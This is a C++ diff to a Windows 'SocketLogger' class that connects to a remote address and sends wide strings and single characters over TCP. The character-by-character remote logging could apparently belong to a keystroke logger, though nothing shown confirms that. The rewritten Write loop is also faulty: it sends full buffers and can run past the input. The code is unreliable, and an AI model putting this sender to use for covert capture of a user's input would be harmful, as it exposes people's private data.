@@ -18,12 +18,14 @@ void SocketLogger::Connect(SOCKET sock, string ipv4, int port) {
 	address.sin_port = htons(port);
 	address.sin_family = AF_INET;
 
+	// Connect remote server
 	connect(sock, (sockaddr*)&address, sizeof(address));
 }
 
 SocketLogger::SocketLogger(string ipv4, int port) {
 	SocketLogger::InitializeWinsock();
 	this->connSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	SocketLogger::Connect(this->connSock, ipv4, port);
 }
 
 SocketLogger::~SocketLogger() {
@@ -31,10 +33,21 @@ SocketLogger::~SocketLogger() {
 	SocketLogger::DisposeWinsock();
 }
 
-void SocketLogger::Write(string output) {
-	send(this->connSock, output.c_str(), output.length(), NULL);
+void SocketLogger::Write(wstring output) {
+	const int bufferSize = 1024;
+
+	wchar_t* wcharBuffer = (wchar_t*)output.c_str();
+	char buffer[bufferSize];
+
+	do {
+		wcstombs_s(NULL, buffer, sizeof(buffer), wcharBuffer, sizeof(buffer) / 2);
+		send(this->connSock, buffer, sizeof(buffer), NULL);
+
+		wcharBuffer += bufferSize / 2;
+
+	} while (strlen(buffer) < sizeof(buffer));
 }
 
-void SocketLogger::Write(char output) {
-	this->Write(string(1, output));
+void SocketLogger::Write(WCHAR output) {
+	this->Write(wstring(1, output));
 }
